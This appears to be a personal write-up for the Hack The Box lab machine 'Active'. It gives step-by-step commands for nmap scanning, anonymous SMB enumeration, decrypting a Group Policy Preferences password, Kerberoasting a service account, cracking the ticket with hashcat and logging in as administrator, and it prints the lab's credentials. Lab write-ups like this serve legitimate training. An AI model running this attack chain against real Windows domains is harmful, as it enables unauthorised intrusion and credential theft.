---
title: HTB - active
date: 2024-08-05 10:00:00
categories:
  - Pentesting
  - Writeups
  - HTB
tags:
  - Pentesting
  - Writeups
  - HTB
  - 
toc: true
---
> **Main steps**: 
    - SMB shares
    - `groups.xml`
    - SharpHound
    - BloodHound
    - Kerberoast

> **services used**: 
    - SMB
    - HTTP
    - Kerberos
    - NTP
    - MSRPC
    - LDAP

---
<!-- more -->

<br>

**OS**: `Windows`
**Difficulty**: `easy`
**IP**: `10.10.10.100`

> **Interesting**: 


## Loot

Credentials
| username | password | hash | service used |
| --- | --- | --- | --- |
|  |  |  |  |
|  |  |  |  |


<br>

## 1. Preparation
```bash Dedicated directory for the target machine
mkdir -p ~/HTB/active
```
```bash Prepare the environment variables
export domain=example.com
export IP=10.10.10.100
export URL=http://$IP
# remember to add odd web ports (8080,8000,8008) and https if needed
```
```bash Prepare files and directories
mkdir vulns recon files notes
touch notes/{notes.txt,users.txt,passwords.txt,hashes.txt,creds.txt}
```

<br>

## 2. Reconnaissance 
```bash Nmap intelligent scan
# initial scan
nmap -Pn -p- --open --max-retries 5 --min-rate 10000 $IP --oA recon/nmap.init
# extract open ports
cat recon/nmap.init | grep '/.*open'| cut -d '/' -f 1| tr '\n' ', '| sed 's/.$//g' > recon/ports;
# full scan on open ports
sudo nmap -Pn -sV -n -v -A -T4 -p $(cat recon/ports) $IP -oA recon/nmap.alltcp
```
```bash Nmap vuln scan (with open ports)
nmap --script vulners -Pn -sC -sV -v -A -T4 -p $(cat recon/ports) $IP -oA recon/nmap.vuln
```
```bash Nmap UDP scan (takes long)
nmap -sCVU -n -F -T4 $IP -oA recon/nmap.udp
```

<br>

## 3. Enumeration

### Port 139,445/TCP - SMB
```bash
enum4linux -a 10.10.10.100

smbmap -H 10.10.10.100

smbclient //10.10.10.100/Replication -U ""%""
```
```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
```
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
# GPPstillStandingStrong2k18
```
```bash
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```
```bash
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```

<br>

## 4. Exploitation
```bash
smb: \SVC_TGS\desktop\> get user.txt
```
```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```
```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

<br>

## 5. Internal enumeration

<br>

## 6. Privilege escalation

```bash
smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
```
```bash
smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968

smb: \> get \users\administrator\desktop\root.txt
```

<br>

---
---